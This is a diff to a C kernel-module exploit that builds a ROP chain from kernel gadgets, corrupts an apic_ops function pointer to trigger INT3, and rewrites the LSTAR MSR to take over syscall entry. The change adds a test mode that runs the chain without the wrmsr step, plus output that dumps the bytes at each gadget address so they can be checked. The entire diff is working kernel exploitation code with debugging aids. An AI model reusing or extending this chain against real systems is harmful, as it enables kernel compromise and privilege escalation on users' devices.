@@ -19,9 +19,10 @@
  * v1 safe test: writes LSTAR back to its current value (no-op wrmsr).
  *
  * Mode (via fw_ver):
- *   0x1: ARM — full chain, apic_ops[2] = CC byte
+ *   0x1: ARM — full chain with wrmsr, apic_ops[2] = CC byte
  *   0x2: READBACK — check sentinel + LSTAR, verify chain fired
  *   0x3: ARM_SAFE — IDT/TSS only, apic_ops[2] = get_timer_freq (no INT3)
+ *   0x4: ARM_NO_WRMSR — chain without wrmsr (uses nop_ret), apic_ops[2] = CC byte
  *
  * Output: see index comments in code below.
  */
@@ -146,7 +147,7 @@ int module_start(kproc_args* args)
     out[1] = kdata_base;
     out[2] = ktext_base;
 
-    if (mode == 0x1 || mode == 0x3) {
+    if (mode == 0x1 || mode == 0x3 || mode == 0x4) {
         /*
          * ARM MODE
          *
@@ -252,8 +253,8 @@ int module_start(kproc_args* args)
         write8(s1 + 14*8, 0);                              /* pop r15 */
         write8(s1 + 15*8, 0); write8(s1 + 16*8, 0);       /* skip */
         write8(s1 + 17*8, 0); write8(s1 + 18*8, 0);       /* skip */
-        /* iret → wrmsr_ret; wrmsr ret pops [STAGE2] */
-        write8(s1 + 19*8, wrmsr_ret);
+        /* iret → wrmsr_ret (mode 1) or nop_ret (mode 4); ret pops [STAGE2] */
+        write8(s1 + 19*8, (mode == 0x4) ? nop_ret : wrmsr_ret);
         write8(s1 + 20*8, 0x20);
         write8(s1 + 21*8, 0x2);
         write8(s1 + 22*8, kdata_base + STAGE2_OFF);
@@ -405,13 +406,13 @@ int module_start(kproc_args* args)
 
         /* Set apic_ops[2] */
         uint64_t cc_candidate = kdata_base + OFF_COPYIN - 1;
-        if (mode == 0x1)
+        if (mode == 0x1 || mode == 0x4)
             apic[2] = cc_candidate;   /* CC byte → triggers INT3 */
         else
             apic[2] = get_timer_freq; /* safe, no INT3 */
 
         /* Report */
-        out[3]  = (mode == 0x1) ? cc_candidate : get_timer_freq;
+        out[3]  = (mode == 0x1 || mode == 0x4) ? cc_candidate : get_timer_freq;
         out[4]  = pop_all_iret;
         out[5]  = doreti_iret;
         out[6]  = wrmsr_ret;
@@ -425,6 +426,11 @@ int module_start(kproc_args* args)
         out[14] = new_lstar;
         out[15] = s5_rflags_slot;   /* dest for trapped RFLAGS+RSP copy */
         out[16] = trap_rflags_addr; /* src for trapped RFLAGS+RSP copy */
+        /* Byte verification: read 8 bytes at each gadget address */
+        out[17] = read8(cc_candidate);     /* should start with 0xCC (INT3) */
+        out[18] = read8((uint64_t)rep_movsb);  /* should be F3 A4 5D C3 ... */
+        out[19] = read8((uint64_t)wrmsr_ret);  /* should be 0F 30 [90] C3 ... */
+        out[20] = read8((uint64_t)pop_all_iret); /* first bytes of pop_all_iret */
 
         out32[1] = 0x0001;
 
